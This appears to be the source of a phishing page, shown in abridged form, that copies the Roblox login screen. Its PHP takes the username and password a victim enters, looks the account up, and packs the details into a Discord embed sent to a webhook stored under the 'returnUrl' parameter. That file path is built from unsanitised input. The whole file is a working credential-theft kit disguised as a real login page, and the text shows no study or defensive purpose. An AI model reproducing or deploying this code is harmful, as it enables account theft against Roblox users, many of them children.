...
session_start();
require('setup.php');
$Termed = $_GET["returnUrl"];
$webhook = file_get_contents("tokens/$Termed/webhook.txt");
?>
...
<html><!--<![endif]--><head data-machine-id="CHI2-WEB6"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
	...
	Roblox.EnvironmentUrls = {
		"abtestingApiSite": "https://www.roblox.com",
		"accountInformationApi": "https://www.roblox.com",
		...
		"friendsApi": "https://www.roblox.com",
		...
		"metricsApi": "https://www.roblox.com",
		...
		"thumbnailsApi": "https://www.roblox.com",
		...
		"universalAppConfigurationApi": "https://www.roblox.com/universal-app-configuration",
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    if (empty($username) || empty($password)) {
        echo "<div aria-live='polite'><p class='form-control-label xsmall text-error login-error' id='login-form-error'>Username and password are required.</p></div>";
    } else if (strlen($username) < 3 || strlen($username) > 20) {
        echo "<div aria-live='polite'><p class='form-control-label xsmall text-error login-error' id='login-form-error'>Username length must be between 3 and 20 characters.</p></div>";
    } else if (strlen($password) < 8 || strlen($password) > 200) {
        echo "<div aria-live='polite'><p class='form-control-label xsmall text-error login-error' id='login-form-error'>Password length must be between 8 and 200 characters.</p></div>";
    }
    else {

      $url = "https://www.roblox.com/user.aspx?username=" . urlencode($username);
             ...
             "content" => "",
                "embeds" => [
                    [
                        ...
                        "description" => "**[Rolimon's](https://www.rolimons.com/player/$userId) | [Profile](https://roblox.com/users/$userId/profile) | [Discord Server]($discord)**",
                        "thumbnail" => [
                            "url" => "$image_url",
                        ],
                        "author" => [
                             "name" => "The details to $username's account are listed below",
                        ],
                        "footer" => [
                            "text" => "$siteName • Today at $timestamp",
                          "icon_url" => "$image_url",
                        ],
                        "fields" => [
                            [
                                "name" => "**<:person:1090186928344809472> Username**",
                                "value" => "```$username```",
                                "inline" => false
                            ],
                            [
...
?>
<span id="loading" class="spinner spinner-default" style="display: none;"></span>
<button type="submit" id="myButton" class="btn-full-width login-button btn-secondary-md">Log In</button>
...
<ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done" style="display: none !important;" data-ad-status="unfilled"><div id="aswift_0_host" tabindex="0" title="Advertisement" aria-label="Advertisement" style="border: none; height: 0px; width: 0px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"><iframe id="aswift_0" name="aswift_0" browsingtopics="true" style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allow="attribution-reporting" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub